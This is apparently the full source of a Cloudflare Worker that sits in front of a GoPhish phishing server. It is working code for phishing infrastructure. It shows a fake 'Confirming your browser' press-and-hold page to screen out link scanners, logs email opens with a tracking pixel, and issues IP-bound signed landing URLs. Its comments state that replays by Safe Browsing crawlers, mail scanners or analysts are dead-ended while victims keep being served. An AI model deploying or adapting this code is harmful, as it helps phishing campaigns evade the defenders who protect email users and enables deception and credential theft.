/*
 * gophish-redirector — Cloudflare Worker
 *
 * Sits in front of the GoPhish phishing server. Bot defense is a single
 * visible press-and-hold gesture: the click page shows a button the visitor
 * must hold for ~1.2s. Only on completion does the page POST to /__verify and
 * get redirected to the landing page. Non-JS scanners and link-prefetchers
 * never run the script or perform the held-pointer gesture, so they never
 * reach GoPhish. There is no User-Agent, ASN, or environment fingerprinting.
 *
 * Authentication to GoPhish is via an IP-bound signed URL. After the bot
 * checks pass, the Worker appends id and sig = HMAC-SHA256(secret,
 * id + "." + CF-Connecting-IP) to the landing URL it sends to GoPhish.
 * Because both the Worker and GoPhish sit behind Cloudflare, GoPhish sees
 * the same client IP in the same header and recomputes an identical
 * signature. There is no expiry: a visitor reloading from the same IP is
 * served indefinitely, while the same URL replayed from any other network —
 * a Safe Browsing verification crawl, a mail scanner, an analyst — computes
 * a different IP, fails the signature, and is dead-ended to PHISH_ORIGIN/404.
 *
 * The server-side-fetched /hi endpoint is signed against the id alone
 * (sig = HMAC-SHA256(secret, id)), because the Worker — not the target's
 * browser — issues that request, so the IP GoPhish sees on it is the
 * Worker's, not the visitor's.
 *
 * Endpoints:
 *   /<anything>/hi?id=<rid>   → tracking pixel. Worker fires a
 *                               server-side GET to GoPhish's /hi to log
 *                               the open event, then returns 204 to the
 *                               mail client. No bot check, no JS.
 *   /<anything>?id=<rid>      → click. Serves the press-and-hold page.
 *   /__verify?id=<rid>        → gesture completion (POST). Mints the
 *                               IP-bound landing URL and returns it as
 *                               {target} JSON.
 *
 * Any request without a valid ?id= is 302-redirected to PHISH_ORIGIN/404
 * (which GoPhish in turn sends to its configured not_found_redirect_url).
 *
 * Env vars (configure in Cloudflare dashboard → Workers → Settings → Variables):
 *   SECRET            64-char hex string. Must match
 *                     phish_server.redirector.secret in GoPhish config.json.
 *   PHISH_ORIGIN      e.g. https://phish.example.com (no trailing slash needed)
 */

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const origin = (env.PHISH_ORIGIN || '').replace(/\/+$/, '');
    const rid = url.searchParams.get('id');
    if (!rid) return notFound(origin);

    const key = await importHmacKey(env.SECRET);

    // /hi tracking pixel — Worker fires a server-side GET, returns 204.
    if (/\/hi$/.test(url.pathname)) {
      const target = `${origin}${url.pathname}?${await signedParams(rid, key)}`;
      ctx.waitUntil(fetch(target, { method: 'GET' }).catch(() => {}));
      return new Response(null, {
        status: 204,
        headers: { 'Cache-Control': 'no-store' },
      });
    }

    // Gesture-completion endpoint.
    if (url.pathname === '/__verify') {
      return handleVerify(request, rid, key, origin);
    }

    // Click path — serve the press-and-hold page.
    return new Response(pressHoldHTML(rid), {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
        'Referrer-Policy': 'no-referrer',
        'X-Robots-Tag': 'noindex, nofollow',
      },
    });
  },
};

// ─────────────────────────────────────────────────────────────────────
// /__verify — press-and-hold completion handler
// ─────────────────────────────────────────────────────────────────────

async function handleVerify(request, rid, key, origin) {
  if (request.method !== 'POST') {
    return new Response(null, { status: 405 });
  }

  let body = {};
  try {
    body = await request.json();
  } catch (e) {
    // Tolerate a missing/garbled body — fall back to the root path below.
  }

  // Mint the IP-bound signed target URL on the original path. The
  // signature binds to this visitor's CF-Connecting-IP; the landing GET that
  // follows travels victim → Cloudflare → gophish, so gophish sees the same
  // IP and validates. A replay from any other network will not.
  const ip = request.headers.get('CF-Connecting-IP') || '';
  const path = sanitizePath(body && body.path);
  const target = `${origin}${path}?${await signedParamsIP(rid, ip, key)}`;
  return jsonResponse({ target }, 200);
}

// sanitizePath restricts the path the JS can ask the Worker to redirect
// to. Must start with /, must not contain "//" (which would be a host
// override in some parsers), must not contain "?" or "#".
function sanitizePath(p) {
  if (typeof p !== 'string' || p.length === 0) return '/';
  if (p[0] !== '/') return '/';
  if (p.indexOf('//') !== -1) return '/';
  if (p.indexOf('?') !== -1 || p.indexOf('#') !== -1) return '/';
  return p;
}

// ─────────────────────────────────────────────────────────────────────
// Signed URL
// ─────────────────────────────────────────────────────────────────────

async function importHmacKey(hexSecret) {
  return crypto.subtle.importKey(
    'raw',
    hexToBytes(hexSecret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
}

// sign returns the hex HMAC-SHA256(secret, msg). The exact byte sequence of
// msg must match what the gophish side hashes, or the comparison fails.
async function sign(msg, key) {
  const sigBuf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(msg));
  return toHex(new Uint8Array(sigBuf));
}

// signedParams returns "id=<rid>&sig=<hex>" where sig = HMAC(secret, rid).
// Used for the /hi endpoint the Worker fetches server-side: the IP gophish
// sees on it is the Worker's, not the visitor's, so it is bound to the rid
// alone.
async function signedParams(rid, key) {
  const sig = await sign(rid, key);
  return `id=${encodeURIComponent(rid)}&sig=${sig}`;
}

// signedParamsIP returns "id=<rid>&sig=<hex>" where sig =
// HMAC(secret, rid + "." + ip). Used for the landing URL handed to the
// visitor's browser: gophish recomputes it against the CF-Connecting-IP it
// sees, so only a request from the same client IP validates. The "."
// delimiter and the raw IP string must match the gophish side exactly.
async function signedParamsIP(rid, ip, key) {
  const sig = await sign(rid + '.' + ip, key);
  return `id=${encodeURIComponent(rid)}&sig=${sig}`;
}

// ─────────────────────────────────────────────────────────────────────
// helpers
// ─────────────────────────────────────────────────────────────────────

function hexToBytes(hex) {
  const clean = (hex || '').trim();
  const out = new Uint8Array(clean.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = parseInt(clean.substr(i * 2, 2), 16);
  }
  return out;
}

function toHex(bytes) {
  return [...bytes].map(b => b.toString(16).padStart(2, '0')).join('');
}

function jsonResponse(obj, status) {
  return new Response(JSON.stringify(obj), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
    },
  });
}

// notFound 302-redirects to PHISH_ORIGIN/404. Used for any request without a
// valid ?id=. GoPhish has no /404 route, so the catch-all rejects it (no valid
// signature) and forwards to its configured not_found_redirect_url.
function notFound(origin) {
  return new Response(null, {
    status: 302,
    headers: { 'Location': `${origin}/404`, 'Cache-Control': 'no-store' },
  });
}

// ─────────────────────────────────────────────────────────────────────
// Press-and-hold page
// ─────────────────────────────────────────────────────────────────────

// HOLD_MS is the duration the button must be held before the gesture
// completes and the page POSTs to /__verify.
const HOLD_MS = 1200;

function pressHoldHTML(rid) {
  const ridJSON = JSON.stringify(rid);
  return `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">` +
    `<meta name="viewport" content="width=device-width, initial-scale=1">` +
    `<meta name="robots" content="noindex,nofollow"><title>Verifying…</title>` +
    `<style>` +
      `*{box-sizing:border-box}html,body{height:100%;margin:0}` +
      `body{display:flex;align-items:center;justify-content:center;background:#f5f6f8;color:#1f2328;` +
        `font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}` +
      `.card{width:min(92vw,360px);background:#fff;border:1px solid #e4e6eb;border-radius:12px;` +
        `padding:28px 24px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.06)}` +
      `.title{font-size:16px;font-weight:600;margin:0 0 6px}` +
      `.sub{font-size:13px;color:#6b7280;margin:0 0 22px}` +
      `.btn{position:relative;width:100%;height:46px;border:0;border-radius:8px;cursor:pointer;` +
        `font-size:14px;font-weight:600;color:#fff;background:#2563eb;overflow:hidden;` +
        `user-select:none;-webkit-user-select:none;touch-action:none}` +
      `.btn:disabled{cursor:default;opacity:.9}` +
      `.fill{position:absolute;left:0;top:0;bottom:0;width:0;background:rgba(255,255,255,.28)}` +
      `.label{position:relative;z-index:1}` +
    `</style></head><body>` +
    `<div class="card">` +
      `<p class="title">Confirming your browser</p>` +
      `<p class="sub">Press and hold the button to continue.</p>` +
      `<button class="btn" id="b"><span class="fill" id="f"></span><span class="label" id="l">Press &amp; Hold</span></button>` +
    `</div>` +
    `<script>(function(){` +
      `var HOLD=${HOLD_MS},b=document.getElementById('b'),f=document.getElementById('f'),l=document.getElementById('l');` +
      `var start=0,raf=0,done=false;` +
      `function reset(){start=0;if(raf){cancelAnimationFrame(raf);raf=0;}f.style.width='0';}` +
      `function tick(){if(!start)return;var p=Math.min(1,(Date.now()-start)/HOLD);f.style.width=(p*100)+'%';` +
        `if(p>=1){finish();}else{raf=requestAnimationFrame(tick);}}` +
      `function hold(e){e.preventDefault();if(done)return;start=Date.now();raf=requestAnimationFrame(tick);}` +
      `function release(){if(done)return;reset();}` +
      `async function finish(){if(done)return;done=true;if(raf){cancelAnimationFrame(raf);raf=0;}` +
        `f.style.width='100%';l.textContent='Verifying…';b.disabled=true;` +
        `try{var r=await fetch('/__verify?id='+encodeURIComponent(${ridJSON}),{` +
          `method:'POST',headers:{'Content-Type':'application/json'},` +
          `body:JSON.stringify({path:location.pathname})});` +
          `if(r.ok){var d=await r.json();if(d&&d.target){location.replace(d.target);return;}}` +
        `}catch(e){}` +
        `done=false;b.disabled=false;l.textContent='Try again';reset();}` +
      `b.addEventListener('pointerdown',hold);` +
      `b.addEventListener('pointerup',release);` +
      `b.addEventListener('pointerleave',release);` +
      `b.addEventListener('pointercancel',release);` +
      `b.addEventListener('contextmenu',function(e){e.preventDefault();});` +
    `})();</script></body></html>`;
}
